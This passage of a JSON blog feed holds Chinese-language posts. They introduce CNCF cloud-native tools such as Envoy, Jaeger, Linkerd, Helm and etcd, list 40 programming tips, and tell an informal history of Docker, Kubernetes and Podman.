Prometheus。</p>\n</li>\n</ul>\n</li>\n<li><p><a href=\"https://www.envoyproxy.io\">Envoy</a>        边缘和服务代理</p>\n<ul>\n<li><p><a href=\"https://github.com/envoyproxy/envoy\">github</a></p>\n<p>Envoy（或 Envoy 代理）是专为云原生应用设计的开源的边缘代理和服务代理。由 Lyft 创建的 Envoy 是为单一服务和应用而设计的高性能的 C++ 开发的分布式代理，同时也是为由大量微服务组成的服务网格架构而设计的通信总线和通用数据平面。Envoy 建立在 Nginx、HAProxy、硬件负载均衡器和云负载均衡器等解决方案的基础上，Envoy 与每个应用相伴（并行）运行，并通过提供平台无关的方式提供通用特性来抽象网络。</p>\n<p>当基础设施中的所有服务流量都经过 Envoy 网格时，很容易就可以通过一致的可观测性来可视化问题域，调整整体性能，并在单个位置添加基础功能。基本上，Envoy 代理是一个可帮助组织为生产环境构建容错系统的服务网格工具。</p>\n<p>服务网格应用有很多替代方案，例如 Uber 的 Linkerd（下面会讨论）和 Istio。Istio 通过将其部署为 Sidecar 并利用了 Mixer 的配置模型，实现了对 Envoy 的扩展。Envoy 的显著特性有：</p>\n<p>◈ 包括所有的“入场筹码(table stakes)（LCTT 译注：引申为基础必备特性）”特性（与 Istio 这样的控制平面组合时）</p>\n<p>◈ 带载运行时 99% 数据可达到低延时</p>\n<p>◈ 可以作为核心的 L3/L4 过滤器，提供了开箱即用的 L7 过滤器</p>\n<p>◈ 支持 gRPC 和 HTTP/2（上行/下行）</p>\n<p>◈ 由 API 驱动，并支持动态配置和热重载</p>\n<p>◈ 重点关注指标收集、跟踪和整体可监测性</p>\n</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li><p><a href=\"https://coreos.com/rkt/docs/latest\">rkt</a>        Pod 原生的容器引擎</p>\n<ul>\n<li><p><a href=\"https://github.com/rkt/rkt\">github</a></p>\n<p>rkt, 读作“rocket”，是一个 Pod 原生的容器引擎。它有一个命令行接口用来在 Linux 上运行容器。从某种意义上讲，它和其他容器如 Podman、Docker 和 CRI-O 相似。</p>\n</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li><p><a href=\"https://www.jaegertracing.io\">Jaeger</a>        分布式跟踪系统</p>\n<ul>\n<li><p><a href=\"https://github.com/jaegertracing/jaeger\">github</a></p>\n<p>Jaeger 是一个开源的端到端的分布式追踪系统，适用于云端应用。在某种程度上，它是像 Prometheus 这样的监控解决方案。但它有所不同，因为其使用场景有所扩展：</p>\n<p>◈ 分布式事务监控</p>\n<p>◈ 性能和延时优化</p>\n<p>◈ 根因分析</p>\n<p>◈ 服务依赖性分析</p>\n<p>◈ 分布式上下文传播</p>\n</li>\n</ul>\n</li>\n<li><p><a href=\"https://linkerd.io\">Linkerd</a>    透明服务网格</p>\n<ul>\n<li><p><a href=\"https://github.com/linkerd/linkerd\">github</a></p>\n<p>像创建 Envoy 代理的 Lyft 一样，Uber 开发了 Linkerd 开源解决方案用于生产级的服务维护。在某些方面，Linkerd 就像 Envoy 一样，因为两者都是服务网格工具，旨在提供平台级的可观测性、可靠性和安全性，而无需进行配置或代码更改。</p>\n<p>但是，两者之间存在一些细微的差异。尽管 Envoy 和 Linkerd 充当代理并可以通过所连接的服务进行上报，但是 Envoy 并不像 Linkerd 那样被设计为 Kubernetes Ingress 控制器。Linkerd 的显著特点包括：</p>\n<p>◈ 支持多种平台（Docker、Kubernetes、DC/OS、Amazon ECS 或任何独立的机器）</p>\n<p>◈ 内置服务发现抽象，可以将多个系统联合在一起</p>\n<p>◈ 支持 gRPC、HTTP/2 和 HTTP/1.x请 求和所有的 TCP 流量</p>\n</li>\n</ul>\n</li>\n<li><p><a href=\"https://helm.sh\">Helm</a>        Kubernetes 包管理器</p>\n<ul>\n<li><p><a href=\"https://github.com/helm/helm\">github</a></p>\n<p>Helm 基本上就是 Kubernetes 的包管理器。如果你使用过 Apache Maven、Maven Nexus 或类似的服务，你就会理解 Helm 的作用。Helm 可帮助你管理 Kubernetes 应用程序。它使用“Helm Chart”来定义、安装和升级最复杂的 Kubernetes 应用程序。Helm 并不是实现此功能的唯一方法；另一个流行的概念是 Kubernetes Operators，它被 Red Hat OpenShift 4 所使用。</p>\n</li>\n</ul>\n</li>\n<li><p><a href=\"https://etcd.io\">Etcd</a>        分布式键值存储</p>\n<ul>\n<li><p><a href=\"https://github.com/etcd-io/etcd\">github</a></p>\n<p>Etcd 是一个分布式的、可靠的键值存储，用于存储分布式系统中最关键的数据。其主要特性有：</p>\n<p>◈ 定义明确的、面向用户的 API（gRPC）</p>\n<p>◈ 自动 TLS，可选的客户端证书验证</p>\n<p>◈ 速度（可达每秒 10,000 次写入）</p>\n<p>◈ 可靠性（使用 Raft 实现分布式）</p>\n<p>Etcd 是 Kubernetes 和许多其他技术的默认的内置数据存储方案。也就是说，它很少独立运行或作为单独的服务运行；相反，它以集成到 Kubernetes、OKD/OpenShift 或其他服务中的形式来运作。还有一个 etcd Operator 可以用来管理其生命周期并解锁其 API 管理功能</p>\n</li>\n</ul>\n</li>\n<li><p><a href=\"https://github.com/cri-o/cri-o/blob/master/awesome.md\">CRI-O</a>    专门用于 Kubernetes 的轻量级运行时环境</p>\n<ul>\n<li><p><a href=\"https://github.com/cri-o/cri-o\">github</a></p>\n<p>CRI-O 是 Kubernetes 运行时接口的 OCI 兼容实现。CRI-O 用于各种功能，包括：</p>\n<p>◈ 使用 runc（或遵从 OCI 运行时规范的任何实现）和 OCI 运行时工具运行</p>\n<p>◈ 使用容器/镜像进行镜像管理</p>\n<p>◈ 使用容器/存储来存储和管理镜像层</p>\n<p>◈ 通过容器网络接口（CNI）来提供网络支持</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>原文章地址：<a href=\"https://mp.weixin.qq.com/s/t4bXqZLtvm_Xc1RiPq7rEw\">https://mp.weixin.qq.com/s/t4bXqZLtvm_Xc1RiPq7rEw</a></p>\n",
            "tags": [
                "开源云",
                "容器",
                "cncf",
                "监控"
            ]
        },
        {
            "id": "https://erik.xyz/2019/12/09/code-author/",
            "url": "https://erik.xyz/2019/12/09/code-author/",
            "title": "老鸟程序员才知道的40个小技巧",
            "date_published": "2019-12-09T14:53:00.000Z",
            "content_html": "<p>来源：知乎，作者：大狐狸</p>\n<p>链接：<a href=\"https://www.zhihu.com/question/36426051/answer/76031743\">https://www.zhihu.com/question/36426051/answer/76031743</a></p>\n<p>1.重构是程序员的主力技能。</p>\n<p>2.工作日志能提升脑容量。</p>\n<p>3.先用profiler调查，才有脸谈优化。</p>\n<p>4.注释贵精不贵多。杜绝大姨妈般的“例注”。漫山遍野的碎碎念注释，实际就是背景噪音。</p>\n<p>5.普通程序员+google=超级程序员。</p>\n<span id=\"more\"></span>\n<p>6.单元测试总是合算的。</p>\n<p>7.不要先写框架再写实现。最好反过来，从原型中提炼框架。</p>\n<p>8.代码结构清晰，其它问题都不算事儿。</p>\n<p>9.好的项目作风硬派，一键测试，一键发布，一键部署；烂的项目生性猥琐，口口相传，不立文字，神神秘秘。</p>\n<p>10.编码不要畏惧变化，要拥抱变化。</p>\n<p>11.常充电。程序员只有一种死法：土死的。</p>\n<ol>\n<li>编程之事，隔离是方向，起名是关键，测试是主角，调试是补充，版本控制是后悔药。</li>\n</ol>\n<ol>\n<li>一行代码一个兵。形成建制才能有战斗力。单位规模不宜过大，千人班，万人排易成万人坑。</li>\n</ol>\n<ol>\n<li>重构/优化/修复Bug，同时只能作一件。</li>\n</ol>\n<ol>\n<li>简单模块注意封装，复杂模块注意分层。</li>\n</ol>\n<ol>\n<li>人脑性能有限，整洁胜于杂乱。读不懂的代码，尝试整理下格式；不好用的接口，尝试重新封装下。</li>\n</ol>\n<ol>\n<li>迭代速度决定工作强度。想多快好省，就从简化开发流程，加快迭代速度开始。</li>\n</ol>\n<ol>\n<li>忘掉优化写代码，过早优化等同恶意破坏；忘掉代码作优化，优化要基于性能测试，而不是纠结于字里行间。</li>\n</ol>\n<ol>\n<li>最好的工具是纸笔；其次好的是markdown。</li>\n</ol>\n<ol>\n<li>leader问任务时间，若答不上来，可能是任务拆分还不够细。</li>\n</ol>\n<ol>\n<li>宁可多算一周，不可少估一天。过于“乐观”容易让boss受惊吓。</li>\n</ol>\n<ol>\n<li>最有用的语言是English。其次的可能是Python。</li>\n</ol>\n<ol>\n<li>百闻不如一见。画出结果，一目了然。调试耗时将大大缩短。</li>\n</ol>\n<ol>\n<li>资源、代码应一道受版本管理。资源匹配错误远比代码匹配错误更难排查。</li>\n</ol>\n<ol>\n<li>不要基于想象开发， 要基于原型开发。原型的价值是快速验证想法，帮大家节省时间。</li>\n</ol>\n<ol>\n<li>序列化首选明文文本 。诸如二进制、混淆、加密、压缩等等有需要时再加。</li>\n</ol>\n<ol>\n<li>编译器永远比你懂微观优化。只能向它不擅长的方向努力。</li>\n</ol>\n<ol>\n<li>不要定过大、过远、过细的计划。即使定了也没有用。</li>\n</ol>\n<ol>\n<li>至少半数时间将花在集成上。时间，时间，时间总是不够。</li>\n</ol>\n<ol>\n<li>与主流意见/方法/风格/习惯相悖时，先检讨自己最可靠。</li>\n</ol>\n<ol>\n<li>出现bug主动查，不管是不是你的。这能让你业务能力猛涨、个人形象飙升; 如果你的bug被别人揪出来…..呵呵，那你会很被动～≧﹏≦</li>\n</ol>\n<ol>\n<li>不知怎么选技术书时就挑薄的。起码不会太贵，且你能看完。</li>\n</ol>\n<ol>\n<li>git是最棒的。简单，可靠，免费。</li>\n</ol>\n<ol>\n<li>仅对“可预测的非理性”抛断言。</li>\n</ol>\n<ol>\n<li>Log要写时间与分类。并且要能重定向输出。</li>\n</ol>\n<ol>\n<li>注释是稍差的文档。更好的是清晰的命名。让代码讲自己的故事。</li>\n</ol>\n<ol>\n<li>造轮子是很好的锻炼方法。前提是你见过别的轮子。</li>\n</ol>\n<ol>\n<li>code review最好以小组/结对的形式。对业务有一定了解，建议会更有价值（但不绝对）。而且不会成为负担。管理员个人review则很容易成team的瓶颈。</li>\n</ol>\n<ol>\n<li>提问前先做调研。问不到点上既被鄙视，又浪费自己的时间。</li>\n</ol>\n<ol>\n<li>永远别小看程序媛(╯3╰)</li>\n</ol>\n",
            "tags": [
                "程序员"
            ]
        },
        {
            "id": "https://erik.xyz/2019/12/03/docker-long/",
            "url": "https://erik.xyz/2019/12/03/docker-long/",
            "title": "容器发展史",
            "date_published": "2019-12-03T15:52:00.000Z",
            "content_html": "<p>一、缘起</p>\n<p>1.1、鸿蒙</p>\n<p>在上古时期，天地初开，一群称之为 “运维” 的人们每天在一种叫作 “服务器” 的神秘盒子中创造属于他们的世界；他们在这个世界中每日劳作，一遍又一遍的写入他们的历史，比如搭建一个 nginx、布署一个 java web 应用…</p>\n<p>大多数人其实并没有那么聪明，他们所 “创造” 的事实上可能是有人已经创造过的东西，他们可能每天都在做着重复的劳动；久而久之，一些人厌倦了、疲惫了…又过了一段时间，一些功力深厚的老前辈创造了一些批量布署工具来帮助人们做一些重复性的劳动，这些工具被起名为 “Asible”、”Chef”、”Puppet” 等等…<br><span id=\"more\"></span><br>而随着时代的发展，”世界” 变得越来越复杂，运维们需要处理的事情越来越多，比如各种网络、磁盘环境的隔离，各种应用服务的高可用…在时代的洪流下，运维们急需要一种简单高效的布署工具，既能有一定的隔离性，又能方便使用，并且最大程度降低重复劳动来提升效率。</p>\n<p>1.2、创世</p>\n<p>在时代洪流的冲击下，一位名为 “Solomon Hykes” 的人异军突起，他创造了一个称之为 Docker 的工具，Docker 被创造以后就以灭世之威向运维们展示了它的强大；一个战斗力只有 5 的运维只需要学习 Docker 很短时间就可以完成资深运维们才能完成的事情，在某些情况下以前需要 1 天才能完成的工作使用 Docker 后几分钟就可以完成；此时运维们已经意识到 “新的时代” 开启了，接下来 Docker 开源并被整个运维界人们使用，Docker 也不断地完善增加各种各样的功能，此后世界正式进入 “容器纪元”。</p>\n<p>二、纷争</p>\n<p>2.1、发展</p>\n<p>随着 Docker 的日益成熟，一些人开始在 Docker 之上创造更加强大的工具，一些人开始在 Docker 之下为其提供更稳定的运行环境…</p>\n<p>其中一个叫作 Google 的公司在 Docker 之上创建了名为 “Kuberentes” 的工具，Kubernetes 操纵 Docker 完成更加复杂的任务；Kubernetes 的出现更加印证了 Docker 的强大，以及 “容器纪元” 的发展正确性。</p>\n<p>2.2、野心</p>\n<p>当然这是一个充满利益的世界，Google 公司创造 Kubernetes 是可以为他们带来利益的，比如他们可以让 Kubernetes 深度适配他们的云平台，以此来增加云平台的销量等；此时 Docker 创始人也成立了一个公司，提供 Docker 的付费服务以及深度定制等；不过值得一提的是 Docker 公司提供的付费服务始终没有 Kubernetes 为 Google 公司带来的利益高，所以在利益的驱使下，Docker 公司开始动起了歪心思: 创造一个 Kubernetes 的替代品，利用用户粘度复制 Kubernetes 的成功，从 Google 嘴里抢下这块蛋糕！此时 Docker 公司只想把蛋糕抢过来，但是他们根本没有在意到暗中一群人创造了一个叫 “rkt” 的东西也在妄图夺走他们嘴里的蛋糕。</p>\n<p>2.3、冲突</p>\n<p>在一段时间的沉默后，Docker 公司又创造了 “Swarm” 这个工具，妄图夺走 Google 公司利用 Kubernetes 赢来的蛋糕；当然，Google 这个公司极其庞大，人数众多，而且在这个社会有很大的影响地位…</p>\n<p>终于，巨人苏醒了，Google 联合了 Redhat、Microsoft、IBM、Intel、Cisco 等公司决定对这个爱动歪脑筋的 Docker 公司进行制裁；当然制裁的手段不能过于暴力，那样会让别人落下把柄，成为别人的笑料，被人所不耻；最总他们决定制订规范，成立组织，明确规定 Docker 的角色，以及它应当拥有的能力，这些规范包括但不限于 CRI、CNI 等；自此之后各大公司宣布他们容器相关的工具只兼容 CRI 等相关标准，无论是 Docker 还是 rkt 等工具，只要实现了这些标准，就可以配合这些容器工具进行使用。</p>\n<p>三、成败</p>\n<p>自此之后，Docker 跌下神坛，各路大神纷纷创造满足 CRI 等规范的工具用来取代 Docker，Docker 丢失了往日一家独大的场面，最终为了顺应时代发展，拆分自己成为模块化组件；这些模块化组件被放置在 mobyproject 中方便其他人重复利用。</p>\n<p>时至今日，虽然 Docker 已经不负以前，但是仍然是容器化首选工具，因为 Docker 是一个完整的产品，它可以提供除了满足 CRI 等标准以外更加方便的功能；但是制裁并非没有结果，Google 公司借此创造了 cri-o 用来满足 CRI 标准，其他公司也相应创建了对应的 CRI 实现；为了进一步分化 Docker 势力，一个叫作 Podman 的工具被创建，它以 cri-o 为基础，兼容大部份 Docker 命令的方式开始抢夺 Dcoker 用户；到目前为止 Podman 已经可以在大部份功能上替代 Docker。</p>\n<p>原文地址：<a href=\"https://mritd.me/2019/06/26/podman-history-of-container\">https://mritd.me/2019/06/26/podman-history-of-container</a></p>\n",
            "tags": [
                "转载",
                "杂谈"
            ]
        }
    ]
}